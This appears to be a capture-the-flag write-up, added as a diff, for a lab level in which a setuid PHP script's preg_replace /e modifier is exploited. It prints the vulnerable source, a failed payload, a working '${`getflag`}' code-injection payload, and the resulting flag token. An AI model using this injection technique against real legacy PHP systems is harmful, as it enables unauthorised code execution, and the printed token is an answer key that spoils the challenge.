@@ -1,0 +1,75 @@
+From the level06 account, the goal was to execute getflag with the privileges of the flag06 account.
+
+The home directory contains two interesting files:
+
+level06
+level06.php
+
+The executable level06 runs the PHP script with elevated privileges.
+
+The PHP source code is:
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+The script reads a file passed as the first argument:
+
+file_get_contents($y)
+
+Then it searches for this pattern:
+
+[x something]
+
+The dangerous line is:
+
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+
+The /e modifier means that the replacement string is evaluated as PHP code.
+This modifier existed in old PHP versions and is dangerous because it can lead to code execution.
+
+At first, I tried this payload:
+
+echo '[x system("/bin/getflag")]' > /tmp/test.txt
+./level06 /tmp/test.txt
+
+Output:
+
+system("/bin/getflag")
+
+This did not execute getflag.
+The reason is that the replacement wraps the matched content inside a double-quoted string:
+
+y("\2")
+
+So the payload becomes equivalent to:
+
+y("system(\"/bin/getflag\")")
+
+In that form, system("/bin/getflag") is only text passed to y(), not PHP code executed directly.
+
+To exploit the vulnerability, I used PHP string interpolation with backticks.
+Backticks execute a shell command in PHP, and the ${...} syntax forces evaluation inside the double-quoted string.
+
+Payload:
+
+echo '[x ${`getflag`}]' > /tmp/test.txt
+
+Then I ran the vulnerable executable:
+
+./level06 /tmp/test.txt
+
+Output:
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+The PHP notice appears because PHP tries to interpret the output of getflag as a variable name.
+However, the command was still executed successfully, and the token is visible in the error message.
+
+Token obtained to access the next level:
+
+wiok45aaoguiboiki2tuin6ub
